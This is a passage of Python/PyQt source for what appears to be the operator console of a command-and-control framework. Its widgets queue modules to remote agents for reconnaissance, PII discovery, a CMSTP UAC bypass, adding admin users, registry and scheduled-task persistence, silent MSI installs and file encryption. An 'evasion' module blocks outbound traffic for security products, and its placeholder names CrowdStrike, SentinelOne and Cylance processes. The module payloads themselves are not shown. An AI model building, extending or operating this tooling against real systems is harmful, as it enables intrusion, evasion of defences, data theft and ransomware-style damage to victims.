        self.convert_markdown_to_rich_text(content)
        self.doc_view.verticalScrollBar().setValue(0)
        
    def start_resize(self, event):
        if self.expanded:
            self.resize_active = True
            self.resize_start_x = event.globalPosition().x()
            self.resize_start_width = self.width()

    def stop_resize(self, event):
        self.resize_active = False
        if self.expanded:
            self.current_width = self.width()

    def do_resize(self, event):
        if self.resize_active:
            delta = event.globalPosition().x() - self.resize_start_x
            new_width = min(max(self.resize_start_width + delta, 200), self.max_width)
            self.setFixedWidth(int(new_width))

    def toggle_panel(self):
        self.expanded = not self.expanded
        new_width = self.current_width if self.expanded else self.min_width
        
        if self.expanded:
            self.show()
            self.setMaximumWidth(self.max_width)
            self.doc_view.verticalScrollBar().setValue(0)
        
        self.animation = QPropertyAnimation(self, b"minimumWidth")
        self.animation.setDuration(200)
        self.animation.setStartValue(self.width())
        self.animation.setEndValue(new_width)
        
        self.max_animation = QPropertyAnimation(self, b"maximumWidth")
        self.max_animation.setDuration(200)
        self.max_animation.setStartValue(self.width())
        self.max_animation.setEndValue(new_width)
        
        self.animation.finished.connect(self.handle_animation_finished)
        
        self.animation.start()
        self.max_animation.start()
    
    def handle_animation_finished(self):
        if not self.expanded:
            self.hide()
    
    def show_panel(self):
        self.show()
        if not self.expanded:
            self.toggle_panel()
            
    def hide_panel(self):
        if self.expanded:
            self.toggle_panel()

    def resizeEvent(self, event):
        super().resizeEvent(event)
        if self.expanded:
            self.preferred_width = event.size().width()

class CommandWidget(QWidget):
    """Widget for sending commands and modules to agents"""
    def __init__(self, agent_repository: AgentRepository, module_handler: ModuleHandler, doc_panel=DocumentationPanel):
        super().__init__()
        self.agent_repository = agent_repository
        self.module_handler = module_handler
        self.doc_panel = doc_panel
        self.current_agent_id = None
        FontManager().add_relative_font_widget(self, 0)
        self.font_manager = FontManager()
        self.setup_ui()

    def setup_ui(self):
        main_layout = QVBoxLayout()
        
        # Create horizontal split for top section
        top_section = QHBoxLayout()
        
        # Left side - Command navigation tree
        self.nav_tree = QTreeWidget()
        self.nav_tree.setHeaderHidden(True)
        self.nav_tree.setMinimumWidth(200)
        self.nav_tree.currentItemChanged.connect(self.on_nav_changed)
        
        # Set up command categories
        categories = {
            "Basic Commands": [
                "Command Execution",
                "WinGet PS Execution"
            ],
            "Discovery": [
                "Basic Recon",
                "Discover PII",
                "Enumerate DCs",
                "Domain Trusts",
                "Domain Admins",
                "Unconstrained Delegation",
                "Active User Membership",
                "Port Scanner"
            ],
            "Evasion": [
                "Deny Outbound Firewall",
                "Host File URL Block",
                "Unhook NTDLL"
            ],
            "Privilege Escalation": [
                "CMSTP UAC Bypass",
                "Run As User",
            ],
            "Persistence": [
                "Add Admin User",
                "Add Startup to Registry",
                "Add Scheduled Task"
            ],
            "Lateral Movement": [
                "Install MSI",
                "RDP Connection",
            ],
            "Impact": [
                "Encrypt Files",
                "Decrypt Files",
            ]
        }
        
        # Populate tree
        for category, commands in categories.items():
            cat_item = QTreeWidgetItem([category])
            for cmd in commands:
                cmd_item = QTreeWidgetItem([cmd])
                cat_item.addChild(cmd_item)
            self.nav_tree.addTopLevelItem(cat_item)
        
        # Right side of top section - Command interface stack
        self.cmd_stack = QStackedWidget()
        
        # Add different execution interfaces
        self.setup_command_prompt()
        self.setup_WinGetPS_script()
        self.setup_BasicRecon()
        self.setup_DiscoverPII()
        self.setup_EnumerateDCs()
        self.setup_DomainTrustRecon()
        self.setup_IdentifyDomainAdmins()
        self.setup_CheckUnconstrainedDelegation()
        self.setup_ActiveUserMembership()
        self.setup_PortScanner()
        self.setup_DenyOutboundFirewall()
        self.setup_HostFileURLBlock()
        self.setup_UnhookNTDLL()
        self.setup_CMSTP_UAC_Bypass()
        self.setup_RunAsUser()
        self.setup_AddAdminUser()
        self.setup_AddScriptToRegistry()
        self.setup_CreateScheduledTask()
        self.setup_InstallMSI()
        self.setup_RDPConnect()
        self.setup_EncryptDirectory()
        self.setup_DecryptDirectory()
        
        # Add nav_tree and cmd_stack to top section
        top_section.addWidget(self.nav_tree)
        top_section.addWidget(self.cmd_stack)
        
        # Create widget for top section
        top_widget = QWidget()
        top_widget.setLayout(top_section)
        
        # Output display (bottom section)
        self.output_display = OutputDisplay(self.agent_repository)
        
        # Create splitter to divide top and bottom sections
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.addWidget(top_widget)
        splitter.addWidget(self.output_display)
        
        # Set initial sizes 
        splitter.setSizes([480, 520])
        
        # Add splitter to main layout
        main_layout.addWidget(splitter)
        main_layout.setContentsMargins(0, 0, 0, 0)
        
        self.setLayout(main_layout)

    def setup_command_prompt(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        self.cmd_input = QTextEdit()  
        self.cmd_input.setPlaceholderText("Enter command...")
        self.cmd_input.setMinimumHeight(100)
        self.send_btn = QPushButton("Queue Command")
        self.send_btn.clicked.connect(self.send_command) 

        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        layout.addWidget(self.cmd_input)
        layout.addWidget(self.send_btn)
        layout.addWidget(docs_button)
        widget.setLayout(layout)
        
        self.cmd_stack.addWidget(widget)

    def send_command(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = self.cmd_input.toPlainText().strip()
        if not command:
            return

        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Command queued!")
            self.cmd_input.clear()
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to send command: {str(e)}")

    def setup_WinGetPS_script(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Add toolbar for common operations
        toolbar = QHBoxLayout()
        load_btn = QPushButton("Load Script")
        save_btn = QPushButton("Save Script")
        clear_btn = QPushButton("Clear")
        
        # Load button functionality
        load_btn.clicked.connect(lambda: QFileDialog.getOpenFileName(
            self, "Load PowerShell Script", "", 
            "PowerShell Scripts (*.ps1);;All Files (*.*)"
        )[0] and open(QFileDialog.getOpenFileName(
            self, "Load PowerShell Script", "", 
            "PowerShell Scripts (*.ps1);;All Files (*.*)"
        )[0], 'r', encoding='utf-8').read() 
        and self.script_editor.setText(open(QFileDialog.getOpenFileName(
            self, "Load PowerShell Script", "", 
            "PowerShell Scripts (*.ps1);;All Files (*.*)"
        )[0], 'r', encoding='utf-8').read()))
        
        # Save button functionality
        save_btn.clicked.connect(lambda: QFileDialog.getSaveFileName(
            self, "Save PowerShell Script", "", 
            "PowerShell Scripts (*.ps1);;All Files (*.*)"
        )[0] and open(QFileDialog.getSaveFileName(
            self, "Save PowerShell Script", "", 
            "PowerShell Scripts (*.ps1);;All Files (*.*)"
        )[0], 'w', encoding='utf-8').write(self.script_editor.toPlainText()))
        
        # Clear button functionality
        clear_btn.clicked.connect(lambda: QMessageBox.question(
            self, "Clear Script", "Are you sure you want to clear the script editor?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        ) == QMessageBox.StandardButton.Yes and self.script_editor.clear())
        
        toolbar.addWidget(load_btn)
        toolbar.addWidget(save_btn)
        toolbar.addWidget(clear_btn)
        toolbar.addStretch()
        

        self.script_editor = QTextEdit()
        self.script_editor.setPlaceholderText("Enter PowerShell script...")
        default_text = ("""
$logFile = "C:\\Temp\\log.txt";
$host = Get-Host;
Set-Content $logFile $host;
$proc = Get-ExecutionPolicy;
Add-Content $logFile -Value $proc;""")
        self.script_editor.setText(default_text.strip())

        run_btn = QPushButton("Run Script")
        run_btn.clicked.connect(self.send_WinGetPS) 

        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel) 
        
        layout.addLayout(toolbar)
        layout.addWidget(self.script_editor)
        layout.addWidget(run_btn)
        layout.addWidget(docs_button)
        widget.setLayout(layout)
        
        self.cmd_stack.addWidget(widget)

    def send_WinGetPS(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        script = self.script_editor.toPlainText().strip()
        command = "execute_module|ExecuteWinGetPS"

        try:
            self.module_handler.execute_winget_ps(self.current_agent_id, script)
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Script queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_BasicRecon(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module performs basic reconnaissance by executing SystemInfo and arp -a")
        explanation.setWordWrap(True)  # Allows text to wrap naturally
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create the button
        recon_btn = QPushButton("Queue Module")
        recon_btn.clicked.connect(self.send_BasicRecon)  

        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add widgets to layout
        layout.addWidget(explanation)
        layout.addWidget(recon_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)

    def send_BasicRecon(self):
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|BasicRecon"
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_DiscoverPII(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module recursively scans text files in a directory to identify potential PII (such as phone numbers, SSNs, and dates)")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        # Directory Path input
        dir_label = QLabel("Directory Path:")
        self.dir_input = QLineEdit()
        self.dir_input.setPlaceholderText("Enter directory path...")
        self.dir_input.setToolTip(
            "Enter the directory path as it appears on the target system\n"
            "Example: C:\\Users\\Administrator\\Documents\\"
        )
        
        # Context Length input
        context_label = QLabel("Context Length:")
        self.context_input = QSpinBox()
        self.context_input.setRange(1, 1000)
        self.context_input.setValue(30)  # Default value
        
        # Add parameters to grid layout
        param_layout.addWidget(dir_label, 0, 0)
        param_layout.addWidget(self.dir_input, 0, 1)
        param_layout.addWidget(context_label, 1, 0)
        param_layout.addWidget(self.context_input, 1, 1)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        recon_btn = QPushButton("Queue Module")
        recon_btn.clicked.connect(self.send_DiscoverPII)

        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(recon_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_DiscoverPII(self):  
        dir_path = self.dir_input.text()
        context_length = self.context_input.value()     
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|DiscoverPII|{dir_path},{context_length}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}") 

    def setup_PortScanner(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module performs TCP port scanning by attempting socket connections to specified IP addresses and ports")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        # IP input
        ip_label = QLabel("Target IPs: ")
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("192.168.1.1")
        self.ip_input.setToolTip(
            "You can also specify in CIDR Notation"
            "Example: 192.168.1.1/24"
        )
        
        # Port input
        port_label = QLabel("Ports: ")
        self.port_input = QLineEdit()
        self.port_input.setPlaceholderText("20-25,53,80")
        self.port_input.setToolTip(
            "Accepts ranges specified with a dash, or comma separated values"
        )
        
        # Add parameters to grid layout
        param_layout.addWidget(ip_label, 0, 0)
        param_layout.addWidget(self.ip_input, 0, 1)
        param_layout.addWidget(port_label, 1, 0)
        param_layout.addWidget(self.port_input, 1, 1)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        scanner_btn = QPushButton("Queue Module")
        scanner_btn.clicked.connect(self.send_PortScanner)

        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(scanner_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_PortScanner(self):  
        ips = self.ip_input.text()
        ports = self.port_input.text()     
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|PortScanner|{ips}%2C{ports}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")     

    def setup_DenyOutboundFirewall(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module blocks outbound traffic through netsh for targeted executable names found in Program Files")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        # IP input
        targetfile_label = QLabel("Target File Names: ")
        self.targetfile_input = QTextEdit()
        self.targetfile_input.setPlaceholderText("csfalconservice, sentinelone, cylancesvc, SEDservice")
        self.targetfile_input.setToolTip(
            "Not case sensitive, comma separated list only."
        )
        
        # Add parameters to grid layout
        param_layout.addWidget(targetfile_label, 0, 0)
        param_layout.addWidget(self.targetfile_input, 1, 0)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        targetfile_btn = QPushButton("Queue Module")
        targetfile_btn.clicked.connect(self.send_DenyOutboundFirewall)

        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(targetfile_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_DenyOutboundFirewall(self):  
        param1 = self.targetfile_input.toPlainText().strip() 
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|DenyOutboundFirewall|{param1}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")       

    def setup_HostFileURLBlock(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module blocks outbound traffic through the host file by setting target URL IPs to 127.0.0.1")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        # IP input
        targetURL_label = QLabel("Target URLs: ")
        self.targetURL_input = QTextEdit()
        self.targetURL_input.setPlaceholderText("example1.com, example2.com")
        self.targetURL_input.setToolTip(
            "Not case sensitive, comma separated list only."
        )
        
        # Add parameters to grid layout
        param_layout.addWidget(targetURL_label, 0, 0)
        param_layout.addWidget(self.targetURL_input, 1, 0)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        targetURL_btn = QPushButton("Queue Module")
        targetURL_btn.clicked.connect(self.send_HostFileURLBlock)

        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(targetURL_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_HostFileURLBlock(self):  
        param1 = self.targetURL_input.toPlainText().strip() 
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|HostFileURLBlock|{param1}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")  

    def setup_RunAsUser(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module re-launches the agent as the specified user")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        param1_label = QLabel("Username: ")
        self.param1_input = QLineEdit()
        self.param1_input.setPlaceholderText("Administrator")
        
        param2_label = QLabel("Password: ")
        self.param2_input = QLineEdit()
        self.param2_input.setPlaceholderText("hunter2")
        
        # Add parameters to grid layout
        param_layout.addWidget(param1_label, 0, 0)
        param_layout.addWidget(self.param1_input, 0, 1)
        param_layout.addWidget(param2_label, 1, 0)
        param_layout.addWidget(self.param2_input, 1, 1)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_RunAsUser)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_RunAsUser(self):  
        username = self.param1_input.text()
        password = self.param2_input.text()     
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|RunAsUser|{username},{password}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")     

    def setup_AddAdminUser(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module creates the specified user and adds them to the Local Administrators group")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        adminusername_label = QLabel("Username: ")
        self.adminusername_input = QLineEdit()
        self.adminusername_input.setPlaceholderText("TestUser")
        
        adminpassword_label = QLabel("Password: ")
        self.adminpassword_input = QLineEdit()
        self.adminpassword_input.setPlaceholderText("P@ssw0rd123!")

        adminfullname_label = QLabel("Full Name: ")
        self.adminfullname_input = QLineEdit()
        self.adminfullname_input.setPlaceholderText("John Hacker")
        
        # Add parameters to grid layout
        param_layout.addWidget(adminusername_label, 0, 0)
        param_layout.addWidget(self.adminusername_input, 0, 1)
        param_layout.addWidget(adminpassword_label, 1, 0)
        param_layout.addWidget(self.adminpassword_input, 1, 1)
        param_layout.addWidget(adminfullname_label, 2, 0)
        param_layout.addWidget(self.adminfullname_input, 2, 1)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_AddAdminUser)

        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_AddAdminUser(self):  
        username = self.adminusername_input.text()
        password = self.adminpassword_input.text()    
        fullname = self.adminfullname_input.text()
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|AddAdminUser|{username},{password},{fullname}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_AddScriptToRegistry(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module adds the agent script to the user's CurrentVersion\\Run registry")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                font-size: 16pt;
                padding: 2px;
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        regvalue_label = QLabel("Key Name: ")
        self.regvalue_input = QLineEdit()
        self.regvalue_input.setPlaceholderText("StartUp")
        self.regvalue_input.setToolTip(
            "This is just the name of the entry that will be created."
        )
        
        # Add parameters to grid layout
        param_layout.addWidget(regvalue_label, 0, 0)
        param_layout.addWidget(self.regvalue_input, 0, 1)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_AddScriptToRegistry)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_AddScriptToRegistry(self):  
        regvalue = self.regvalue_input.text()

        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|AddScriptToRegistry|{regvalue}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_CreateScheduledTask(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module adds a recurring scheduled task. With inputs empty, it will add task to launch the agent.")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        taskname_label = QLabel("Task Name: ")
        self.taskname_input = QLineEdit()
        self.taskname_input.setPlaceholderText("ScheduledTask")
        
        action_label = QLabel("Action: ")
        self.action_input = QLineEdit()
        self.action_input.setPlaceholderText('"App.exe" /param1')

        delay_label = QLabel("Delay (Hours): ")
        self.delay_input = QSpinBox()
        self.delay_input.setToolTip(
            "The task will execute every 24hrs after the delay"
        )
        self.delay_input.setRange(1, 1000)
        
        # Add parameters to grid layout
        param_layout.addWidget(taskname_label, 0, 0)
        param_layout.addWidget(self.taskname_input, 0, 1)
        param_layout.addWidget(action_label, 1, 0)
        param_layout.addWidget(self.action_input, 1, 1)
        param_layout.addWidget(delay_label, 2, 0)
        param_layout.addWidget(self.delay_input, 2, 1)
        
        param_widget.setLayout(param_layout)
        
        # Create the button
        module_btn = QPushButton("Queue Module")
        module_btn.clicked.connect(self.send_CreateScheduledTask)
        
        docs_button = QPushButton(" Show Documentation ")
        docs_button.setIcon(QIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileDialogDetailedView)))
        docs_button.clicked.connect(self.doc_panel.toggle_panel)
        
        # Add all widgets to main layout
        layout.addWidget(explanation)
        layout.addWidget(param_widget)
        layout.addWidget(module_btn)
        layout.addWidget(docs_button)
        
        widget.setLayout(layout)
        self.cmd_stack.addWidget(widget)  

    def send_CreateScheduledTask(self):  
        taskname = self.taskname_input.text()
        action = self.action_input.text()    
        delay = self.delay_input.value()
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        command = (f"execute_module|CreateScheduledTask|{taskname},{action},{delay}")
        try:
            self.agent_repository.update_agent_command(self.current_agent_id, command)
            self.show_tooltip(self.cmd_input, self.send_btn, "Module queued!")
        except Exception as e:
            import traceback
            logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def setup_InstallMSI(self):
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Create and style the explanation label
        explanation = QLabel("This module attempts to download and silently install the specified MSI file. Installs PuTTY by default.")
        explanation.setWordWrap(True)
        explanation.setAlignment(Qt.AlignmentFlag.AlignCenter)
        base_style = self.styleSheet()
        explanation.setStyleSheet(base_style + """
            QLabel {
                border: 1px solid #000000;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #303030); 
            }
        """)

        self.font_manager.add_relative_font_widget(explanation, 2)
        
        # Create parameter inputs
        param_widget = QWidget()
        param_layout = QGridLayout() 
        
        URL_label = QLabel("Download URL: ")
        self.URL_input = QLineEdit()
        self.URL_input.setPlaceholderText("https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.82-installer.msi")
        
        downloadpath_label = QLabel("Download Path: ")
        self.downloadpath_input = QLineEdit()
        self.downloadpath_input.setPlaceholderText("putty-install.msi")

        installdir_label = QLabel("Install Directory: ")
        self.installdir_input = QLineEdit()
